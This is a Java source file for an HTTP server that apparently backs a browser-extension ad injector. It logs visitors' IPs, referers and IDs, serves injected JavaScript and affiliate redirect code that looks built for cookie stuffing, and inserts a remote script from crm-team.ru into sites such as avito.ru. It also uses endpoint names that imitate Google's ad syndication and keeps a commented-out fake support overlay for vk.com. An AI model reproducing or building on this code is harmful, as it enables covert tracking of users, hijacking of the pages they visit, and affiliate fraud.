package ru;
//sd
import java.lang.Boolean;
import java.util.Map;
import java.util.HashMap;
import javax.xml.bind.DatatypeConverter;
import javax.xml.transform.Templates;
import java.io.*;
import java.util.regex.*;
import ru.classes.Mysql;
import java.util.Random;

import ru.classes.Analize;
import ru.classes.AnalizeStore;
import ru.classes.Template;
import ru.classes.ShortLinks;
import ru.classes.ipControll;
import ru.classes.isShowCookie;
import ru.classes.OffersStore;
import ru.objects.Offers;
import ru.classes.Banners;
import ru.objects.ImageInfo;
import ru.objects.RequestObject;

public class App {
    private InputStream is;
    private OutputStream os;
    private String IP;
    private String URL;
    private String UserAgent;
    private String Referer;
    private String Lang;
    private String Rel;
    private String Uid;
    private String Host;
    private String ChromeId;

    private Map<String, String> Params = new HashMap<String, String>();

    public void server(InputStream is, OutputStream os, String IP) throws Throwable {
        this.is = is;
        this.os = os;
        this.IP = IP;

        readInputHeaders();
        String res = appAction();

        if(res != null) {
            int of = res.indexOf("Location: ");
            if(of >= 0) {
                String redirect = res.substring(10, res.length());
                writeResponseRedirect(redirect);
            } else {
                writeResponse(res);
            }
        } else {
            //writeResponseError();
        }

    }

    private void readInputHeaders() throws Throwable {
        BufferedReader br = new BufferedReader(new InputStreamReader(is));
        while(true) {
            String s = br.readLine();
            if(s == null || s.trim().length() == 0) {
                break;
            } else {
                parseInput(s);
            }
        }
    }

    private void writeResponse(String s) throws Throwable {


        Integer i = s.length();

        String response = "HTTP/1.1 200 OK\r\n" +
                "Server: Java Server\r\n" +
                "Content-Type: text/html; charset=utf-8\r\n" +
                "Content-Length: " + i + "\r\n" +
                "Connection: close\r\n\r\n";
        String result = response + s;

        os.write(result.getBytes("ISO-8859-1"));
        os.flush();
        os.close();
    }

    private void writeResponseImg(byte[] s) throws Throwable {
        String response = "HTTP/1.1 200 OK\r\n" +
                "Server: Java Server\r\n" +
                "Content-Type: image/jpeg\r\n" +
                "Content-Length: " + s.length + "\r\n" +
                "Connection: close\r\n\r\n";
        os.write(s);
        os.flush();
        os.close();
    }

    private void writeResponseRedirect(String s) throws Throwable {
        String response = "HTTP/1.1 302 Found\r\n" +
                "Server: Java Server\r\n" +
                "Content-Type: text/html\r\n" +
                "Location: " + s + "\r\n" +
                "Connection: close\r\n\r\n";
        String result = response + s;
        os.write(result.getBytes());
        os.flush();
        os.close();
    }

    private void writeResponseError() throws Throwable {
        String response = "HTTP/1.1 404 Not Found\r\n" +
                "Server: Java Server Error\r\n" +
                "Content-Type: text/html\r\n" +
                "Connection: close\r\n\r\n";
        String result = response;
        os.write(result.getBytes());
        os.flush();
        os.close();
    }

    public void parseInput(String s) throws Exception {
        //System.out.println(s);

        if(s.indexOf("GET") == 0) {
            String url = s.substring(4, s.length() -1);
            this.URL = url.substring(0, url.indexOf("HTTP")-1);

            int index = this.URL.indexOf('?');
            if(index >= 0) {

                String params = this.URL.substring(index+1, this.URL.length());

                this.URL = this.URL.substring(0, index);

                String[] split = params.split("&");

                for (int i = 0; i < split.length; i++) {

                    String[] kv = split[i].split("=");

                    if(kv.length == 1) {
                        Params.put(kv[0], null);
                    } else {
                        Params.put(kv[0], kv[1]);
                    }

                }

            }

        }

        //if(s.indexOf("Host:") >= 0) {
        //    this.HOST = s.substring(6, s.length());
        //}

        if(s.indexOf("User-Agent:") >= 0) {
            this.UserAgent = s.substring(12, s.length());
        }

        if(s.indexOf("Referer:") >= 0) {
            this.Referer = s.substring(9, s.length());
        }

        if(s.indexOf("Accept-Language:") >= 0) {
            this.Lang = s.substring(17, s.length());
            this.Lang = this.Lang.substring(0,2);
        }

        if(s.indexOf("X-Real-IP:") >= 0) {
            this.IP = s.substring(11, s.length());
        }

    }

    public String insertADS(String hostname, String uid, String rel)  throws Exception {

        Offers offer = OffersStore.getInstance().find(hostname);

        //System.out.println(rel);
        //System.out.println(offer);
        String json = "";
        if(offer != null) {
            String html =  Template.getInstance().render("template/insertAds_compile.js");

            RequestObject req = (RequestObject)AnalizeStore.getInstance().getUserData(uid);


            req.SitesOpenedGood++;
            AnalizeStore.getInstance().userData(req);

            Integer bind = 0;
            if(offer.status == 1) {
                if(offer.isFrame == 0) {
                    //if(isShowCookie.getInstance().isShowCookie(this.IP, hostname)) {
                        System.out.println("Set redirect: "+offer.hostname);
                        bind = 1;
                    //} else {
                    //    System.out.println("Use cookie: "+offer.hostname);
                    //}
                } else {
                    System.out.println("Iframe: "+offer.hostname);
                }

            }

            json = "hostname: '"+offer.hostname+"', redirect: '"+offer.redirect+"', status: '"+offer.status+"', url: '"+offer.serverUrl+"', frame: '"+offer.isFrame+"', deep: '"+offer.deep+"', bind: '"+bind+"', isBlank :'" + offer.isBlank + "'";

            String formatJson = Banners.getInstance().getJsonFormat();

            html = html.replace("[\"ggxwp\"]", formatJson);
            //System.out.println(formatJson);

            html = html.replace("cookie_s:\"stuff\"", json);
            //System.out.println("Main " + rel);
            html = html.replace("%lizzzee2%", rel);
            html = html.replace("%uid%", uid);

            return html;
        }


        String domains = Template.getInstance().render("template/domains.js");
        domains = domains.replace("%info%", this.getClienInfo());

        domains = domains.replace("/*anotation*/", this.getBanners(hostname));

        return domains; //"var help = true;";
    }

    public String getBanners(String hostname)  throws Exception {

        String html = Template.getInstance().render("template/tpl_banners/append.js");
        String scripts = "http://crm-team.ru/background.js";

        Integer isDisplay = 0;
        //s
//       Random generator = new Random(); 
//        int rnd = generator.nextInt(3) + 0;
        
//        if(rnd == 1 && hostname != null) {
//       		//System.out.println("rnd2: " + rnd);
//        		isDisplay = 1;
//        		html = html.replace("/*src*/", scripts);
 //       }

        
        if(hostname != null && (hostname.equals("animevost.org") || hostname.equals("avito.ru") || hostname.equals("www.online-life.club") || hostname.equals("yakisugi.ru"))) {

//            isDisplay = 1;
            html = html.replace("/*src*/", scripts);
        }
    		

        if(isDisplay == 0) {
            html = "";
        }

        //System.out.println("getBanners: " + hostname);





        //if(hostname != null && hostname.equals("vk.com")) {

        //    html = html.replace("/*tpl*/", Template.getInstance().render("template/tpl_banners/fake_support.html"));
        //}

        //html = html.replace("/*tpl*/",  "");

        //System.out.println("getBanners: " + hostname);

        return html;
    }

    public String getHtml(String hostname)  throws Exception {
        String html = Template.getInstance().render("template/tpl_banners/fake_support.html");

        return html;
    }

    public String getClienInfo() {
        return "{ip: '"+this.IP+"', lang: '"+this.Lang+"', rel: '"+this.Rel+"', host: '"+this.Host+"', uid: '"+this.Uid+"'}";
    }

    public String getCfg() throws Exception {
        return OffersStore.getInstance().getJsonOffersList();
    }

    public String executeCommand(String command) {

        StringBuffer output = new StringBuffer();

        Process p;
        try {
            p = Runtime.getRuntime().exec(command);
            p.waitFor();
            BufferedReader reader =
                    new BufferedReader(new InputStreamReader(p.getInputStream()));

            String line = "";
            while ((line = reader.readLine())!= null) {
                output.append(line + "\n");
            }

        } catch (Exception e) {
            e.printStackTrace();
        }

        return output.toString();

    }

    public String appAction()  throws Exception  {

        String router = this.URL;
        if(router.equals("/favicon.ico")) {
            return "";
        }

        /*if(router.equals("/img.jpg")) {
            String index = this.Params.get("exec");
            String x = this.Params.get("x");
            String y = this.Params.get("y");

            try {
                this.writeResponseImg(Banners.getInstance().get(index, x, y));
            } catch (Throwable e) {

            }

            return null;
        }*/

        String html = "";

        String host = this.Host = this.Params.get("host");
        String uid = this.Params.get("uid");
        String rel = this.Params.get("rel");
        this.ChromeId = this.Params.get("id");
        if(this.ChromeId == null) {
            this.ChromeId = "not_id";
        }


        if(uid == null) {
            if(rel != null) {
                uid = rel;
            } else {
                uid = "not_uid";
            }

        }

        this.Uid = uid;


        if(rel == null) {
            rel = "not-rel";
        }
        this.Rel = rel;


        String Hostname = Analize.getInstance().request(this.UserAgent, this.Referer, this.IP, this.Lang, rel, host, uid, this.ChromeId);

        //System.out.println("Rel: "+rel +" Uid: "+uid +" Host:"+Hostname);
        //System.out.println("Host: "+Hostname);

        if(router.equals("/getOffer")) {
            String index = this.Params.get("index");
            if(index == null) {
                return "please inser index";
            }

            Offers offer = OffersStore.getInstance().find(index);
            if(offer == null) {
                return "offer not found";
            }

            System.out.println("Redirect: "+index);
            RequestObject req = (RequestObject)AnalizeStore.getInstance().getUserData(uid);

            req.Click++;
            AnalizeStore.getInstance().userData(req);

            //System.out.println("Click count: "+req.Click);

            return  "{\"hostname\": \""+offer.hostname+"\", \"redirect\": \""+offer.redirect+"\", \"status\": \""+offer.status+"\", \"url\": \""+offer.serverUrl+"\", \"frame\": \""+offer.isFrame+"\", \"deep\": \""+offer.deep+"\", \"bind\": \""+offer.isBind+"\"}";
        }

        if(router.equals("/getOfferReg")) {
            String index = this.Params.get("index");
            if(index == null) {
                return "please inser index";
            }

            Offers offer = OffersStore.getInstance().findReg(index);
            if(offer == null) {
                return "offer not found";
            }
            return  "{\"hostname\": \""+offer.hostname+"\", \"redirect\": \""+offer.redirect+"\", \"status\": \""+offer.status+"\", \"url\": \""+offer.serverUrl+"\", \"frame\": \""+offer.isFrame+"\", \"deep\": \""+offer.deep+"\", \"bind\": \""+offer.isBind+"\"}";
        }

        if(router.equals("/com.goocyndicat.iframe")) {
            String x = this.Params.get("x");
            String y = this.Params.get("y");

            ImageInfo banner = Banners.getInstance().getRandomBanner(x,y);

            if(banner == null) {
                html = Template.getInstance().render("template/com.syndicat.iframe_autogen.html");
            } else {
                Offers offer = OffersStore.getInstance().find(banner.index);

                html = Template.getInstance().render("template/com.syndicat.iframe.html");
                html = html.replace("%url%", banner.index);
                html = html.replace("%base64image%", banner.base64);
                html = html.replace("%serverUrl%", offer.serverUrl);
            }

            return html;
        }

        if(router.equals("/privetkakdela.js")) {
            String json = OffersStore.getInstance().getJsonOffers();
            html = Template.getInstance().render("template/newInsertAds.js");
            html = html.replace("{\"cookie_s\":\"stuff\"}", json);

            return html;
        }
		
		if(router.equals("/getDecoder.js")) {
            String json = OffersStore.getInstance().getJsonOffers();
            html = Template.getInstance().render("template/decoder.js");
            //html = html.replace("{\"cookie_s\":\"stuff\"}", json);

            return html;
        }

        if(Hostname != null && Hostname.equals("docs.google.com")) {
            return "";
        }

        if(router.equals("/link")) {
            String link = this.Params.get("l");
            String getLink = ShortLinks.links.get(link);
            if(getLink==null) {
                getLink = "/";
            }
            return "Location: "+getLink;
        }

        if(router.equals("/reload")) {
            String result = "Reload is ok<br />";
            result += this.executeCommand("./yuicompressor.sh");

            App.reloadOffers();
            result += Template.getInstance().reloadTemplates();
            return result;
        }

        if(router.equals("/") || router.equals("/update.js")) {
            //System.out.println("REL!: "+rel);
            html = "var help = true;";
            if(Hostname != null) {
                html = this.insertADS(Hostname, uid, rel);
                //html+=this.siteRoute(Hostname);
            }
            return html;
        }

        if(router.equals("/html")) {
            //System.out.println("REL!: "+rel);
            html = "var help = true;";
            if(Hostname != null) {
                html = this.getHtml(Hostname);
                //html+=this.siteRoute(Hostname);
            }
            return html;
        }
 
        if(router.equals("/notification.json")) {
            String insertAds;
            if(Hostname == null) {
                insertAds = "false";
            } else {
                String ht = this.insertADS(Hostname, uid, rel);
                //ht+=this.siteRoute(Hostname);
                insertAds = new String(DatatypeConverter.printBase64Binary(ht.getBytes()));
            }

            html = Template.getInstance().render("template/injectorJSON.js");
            html = html.replace("%code%", insertAds);

            return html;
        }

        if(router.equals("/getSubscribe")) {
            return this.getCfg();
        }
		
		if(router.equals("/wedied")) {
            String link = this.Params.get("l");
            if(link == null) {
                link = this.Referer;
            }
            return "Location: " + link;
        }

        if(router.equals("/mgr.php")) {

            String tpl = Template.getInstance().render("template/mgr.php");

            String p = this.Params.get("p");
            if(p == null) {
                return "not params";
            }

            String[] split = this.Params.get("p").split("x");

            tpl = tpl.replace("%x%", split[0]);
            tpl = tpl.replace("%y%", split[1]);
            tpl = tpl.replace("%url%", "https://aferon.com/download-game/3D-Magic-Mahjongg-for-pc.html?bb=qwe");

            return tpl;
        }


        if(router.equals("/ads_ex.php")) {

            String exec = this.Params.get("exec");
            String backUrl = this.Params.get("url");

            Offers offer = OffersStore.getInstance().find(exec);

            if(backUrl != null) {
                if(backUrl.indexOf("http") < 0) {
                    backUrl = "http://"+exec+backUrl;
                }
            }
            //return p;

            String link = "#";
            if(offer != null) {
                link = offer.redirect+offer.deep+backUrl;
            } else {
                if(backUrl != null) {
                    link = backUrl;
                } else {
                    link = "http://"+exec;
                }
            }


            String tpl = Template.getInstance().render("template/ads_ex.php");

            System.out.println(link);
            tpl = tpl.replace("%url%", link);

            return tpl;
        }

        if(router.equals("/ads.php")) {
            //Hostname = "aliexpress.com";
            if(Hostname == null) {
                return "ok";
            }

            //System.out.println("st");
            Offers offer = OffersStore.getInstance().find(Hostname);
            //System.out.println(offer);
            String link = "#";

            if(offer != null) {
                link = offer.redirect;
            }

            String tpl = Template.getInstance().render("template/pro.html");

            tpl = tpl.replace("%url%", link);

            return tpl;
        }

        Pattern pattern = Pattern.compile("/[^/]+/[^.]+.html");
        Matcher matcher = pattern.matcher(this.URL);

        if (matcher.matches()) {
            String bb = this.Params.get("bb");
            if(bb != null) {
                return Template.getInstance().render("template/mdblock.php");
            } else {
                return "ok";
            }
        }

        if(router.equals("/site")) {
            return Analize.getInstance().getSiteJson();
        }


        //default 404
        html = "var help = true;";
        if(Hostname != null) {
            html = this.insertADS(Hostname, uid, rel);
            //html+=this.siteRoute(Hostname);
        }
        return html;
    }


    public static void dbLoader() {
        try {
            System.err.println ("load db");
            Mysql.getInstance().mysqlInit();
            //ipControll.getInstance().loadMysql();
            //ShortLinks.getInstance().loadMysql();
            OffersStore.getInstance().loadMysql();
            //AnalizeStore.getInstance().loadUsersFromMysql();
            //Banners.getInstance().loadImages();
            Mysql.getInstance().mysqlClose();
        }
        catch (Exception e)
        {
            e.printStackTrace();
        }
    }

    public static void reloadOffers() {
        try {
            System.err.println ("reload db offers");
            Mysql.getInstance().mysqlInit();
            OffersStore.getInstance().loadMysql();
            Mysql.getInstance().mysqlClose();
        }
        catch (Exception e)
        {
            e.printStackTrace();
        }
    }

}
